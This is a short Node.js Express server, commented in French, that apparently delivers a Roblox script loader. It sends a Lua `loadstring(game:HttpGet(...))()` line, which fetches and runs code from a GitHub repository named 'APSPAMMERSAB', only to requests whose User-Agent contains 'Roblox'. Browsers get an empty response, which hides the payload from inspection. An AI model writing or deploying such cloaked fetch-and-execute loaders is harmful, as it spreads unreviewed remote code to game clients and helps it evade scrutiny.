const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

// Le script Lua à renvoyer au client (Roblox)
const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/plantapi662-lab/APSPAMMERSAB/refs/heads/main/W"))()`;

app.get("/", (req, res) => {
  // Vérifie l'en-tête 'User-Agent' pour savoir si la requête provient de Roblox
  const userAgent = req.headers['user-agent'] || '';

  // Si le User-Agent contient 'Roblox', on renvoie le code Lua
  if (userAgent.includes("Roblox")) {
    res.type("text/plain");  // Envoie le code Lua en tant que texte brut
    res.send(luaScript);     // Envoie le script Lua
  } else {
    // Si la requête provient d'un navigateur, on renvoie une page vide
    res.status(204).send();  // Renvoie un code de statut 204 (No Content), donc page vide
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
